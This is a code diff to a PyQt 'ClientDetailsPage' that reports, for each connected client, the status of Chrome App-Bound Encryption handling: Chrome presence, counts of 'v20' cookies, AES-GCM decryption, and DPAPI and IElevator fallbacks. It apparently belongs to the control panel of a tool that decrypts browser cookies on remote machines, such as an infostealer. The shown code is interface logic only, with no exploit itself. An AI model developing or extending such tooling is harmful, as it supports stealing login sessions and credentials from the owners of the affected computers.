@@ -619,26 +619,41 @@ class ClientDetailsPage(QtWidgets.QWidget):
         if not hasattr(self, "abe_features_card"):
             return
 
+        # Get diagnostic values from payload
+        is_windows = bool(payload.get("windows"))
+        chrome_installed = bool(payload.get("chrome_installed"))
+        elevation_service = bool(payload.get("elevation_service"))
+        dpapi_available = bool(payload.get("dpapi_available"))
+        ielevator_available = bool(payload.get("ielevator_available"))
+        detected = bool(payload.get("detected"))
+        available = bool(payload.get("available"))
+        cookies_v20 = payload.get("cookies_v20")
+        cookies_total = payload.get("cookies_total")
+
+        # Build dynamic descriptions with actual values
+        def yes_no(val: bool) -> str:
+            return self.i18n.t("proxy_bool_yes") if val else self.i18n.t("proxy_bool_no")
+
         feature_status = {
             "abe_key_detection": {
-                "active": True,
-                "desc": self.i18n.t("abe_feature_key_detection_desc"),
+                "active": is_windows and chrome_installed,
+                "desc": f"{self.i18n.t('abe_feature_key_detection_desc')} (Chrome: {yes_no(chrome_installed)})",
             },
             "v20_value_detection": {
-                "active": True,
-                "desc": self.i18n.t("abe_feature_v20_detection_desc"),
+                "active": isinstance(cookies_v20, int) and cookies_v20 > 0,
+                "desc": f"Cookies v20: {cookies_v20 if isinstance(cookies_v20, int) else '--'} / {cookies_total if isinstance(cookies_total, int) else '--'}",
             },
             "support_check": {
-                "active": True,
-                "desc": "check_abe_support()",
+                "active": is_windows,
+                "desc": f"check_abe_support() → Windows: {yes_no(is_windows)}",
             },
             "aes_gcm_decryption": {
-                "active": bool(payload.get("detected") and payload.get("available")),
-                "desc": self.i18n.t("abe_feature_aes_gcm_desc"),
+                "active": detected and available,
+                "desc": f"{self.i18n.t('abe_feature_aes_gcm_desc')} ({yes_no(detected and available)})",
             },
             "dpapi_fallback": {
-                "active": bool(payload.get("dpapi_available")),
-                "desc": self.i18n.t("abe_feature_dpapi_fallback_desc"),
+                "active": dpapi_available,
+                "desc": f"DPAPI: {yes_no(dpapi_available)}, IElevator: {yes_no(ielevator_available)}",
             },
             "logging": {
                 "active": True,
@@ -651,7 +666,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         }
 
         active_color = "#37d67a"
-        inactive_color = "#9fb0c3"
+        inactive_color = "#ff6b6b"  # Red for inactive/unavailable
 
         for key, item in self.abe_feature_items.items():
             status_dot, desc_label = item
